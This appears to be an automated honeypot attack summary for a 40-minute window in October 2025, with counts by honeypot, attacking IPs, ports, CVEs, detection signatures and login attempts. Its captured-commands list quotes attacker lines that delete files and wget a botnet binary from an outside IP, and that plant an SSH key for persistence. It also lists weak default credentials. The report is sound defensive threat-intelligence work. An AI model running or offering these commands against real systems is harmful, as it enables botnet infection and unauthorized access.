
# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-15T01:01:41Z
**Timeframe:** 2025-10-15T00:20:01Z to 2025-10-15T01:00:02Z
**Files:** `agg_log_20251015T002001Z.json`, `agg_log_20251015T004001Z.json`, `agg_log_20251015T010002Z.json`

## Executive Summary

This report summarizes 17,200 attacks recorded by honeypots. The primary attack vectors were network scans and exploitation attempts targeting multiple services. A significant portion of the attacks were captured by the Honeytrap, Suricata, and Cowrie honeypots. The most frequent attacks originated from IP address `47.251.171.50`. Several CVEs were detected, with `CVE-2019-11500` being the most common. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing backdoors.

## Detailed Analysis

### Attacks by Honeypot
- Honeytrap: 4,034
- Suricata: 3,208
- Cowrie: 2,645
- Sentrypeer: 2,499
- Ciscoasa: 1,904
- Redishoneypot: 1,662
- Mailoney: 956
- ssh-rsa: 110
- H0neytr4p: 68
- Tanner: 52
- ConPot: 24
- Adbhoney: 13
- Dionaea: 8
- ElasticPot: 8
- Honeyaml: 7
- Ipphoney: 1
- Wordpot: 1

### Top Attacking IPs
- 47.251.171.50
- 181.196.250.214
- 206.191.154.180
- 86.54.42.238
- 185.243.5.146
- 185.243.5.148
- 172.86.95.115
- 172.86.95.98
- 193.32.162.157
- 185.243.5.121

### Top Targeted Ports/Protocols
- 5060
- 6379
- TCP/445
- 25
- 22
- 8333
- 5903
- TCP/1433
- 443
- 80

### Most Common CVEs
- CVE-2019-11500 CVE-2019-11500
- CVE-2002-0013 CVE-2002-0012
- CVE-2002-1149

### Commands Attempted by Attackers
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass...`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`
- `cat /proc/cpuinfo | grep name | wc -l`
- `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
- `uname -m`
- `w`
- `crontab -l`
- `which ls`
- `ls -lh $(which ls)`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`

### Signatures Triggered
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
- ET DROP Dshield Block Listed Source group 1
- ET SCAN MS Terminal Server Traffic on Non-standard Port
- ET SCAN NMAP -sS window 1024
- ET SCAN Suspicious inbound to MSSQL port 1433
- ET HUNTING RDP Authentication Bypass Attempt
- ET INFO Reserved Internal IP Traffic
- ET SCAN Suspicious inbound to PostgreSQL port 5432
- ET WEB_SERVER Possible HTTP 404 XSS Attempt (Local Source)
- ET CINS Active Threat Intelligence Poor Reputation IP group 46

### Users / Login Attempts
- root/
- debian/1234567890
- root/root2025
- operator/operator2015
- ubnt/6666
- 345gs5662d34/345gs5662d34
- test/8888888
- nobody/44444
- root/calimedellin
- guest/2

### Files Uploaded/Downloaded
- arm.urbotnetisass;
- arm.urbotnetisass
- arm5.urbotnetisass;
- arm5.urbotnetisass
- arm6.urbotnetisass;
- arm6.urbotnetisass
- arm7.urbotnetisass;
- arm7.urbotnetisass
- x86_32.urbotnetisass;
- x86_32.urbotnetisass
- mips.urbotnetisass;
- mips.urbotnetisass
- mipsel.urbotnetisass;
- mipsel.urbotnetisass
- ?format=json

### HTTP User-Agents
- No user agents were logged in this timeframe.

### SSH Clients and Servers
- No specific SSH clients or servers were logged in this timeframe.

### Top Attacker AS Organizations
- No attacker AS organizations were logged in this timeframe.

## Key Observations and Anomalies

- A large number of attacks were related to the DoublePulsar backdoor, indicating attempts to exploit SMB vulnerabilities.
- The command `cd /data/local/tmp/; rm *; busybox wget ...` suggests attempts to download and execute malicious payloads on Android devices.
- The repeated attempts to add an SSH key to `authorized_keys` indicate a common tactic to maintain persistent access.
- There is a noticeable concentration of attacks from a small number of IP addresses, suggesting targeted campaigns.
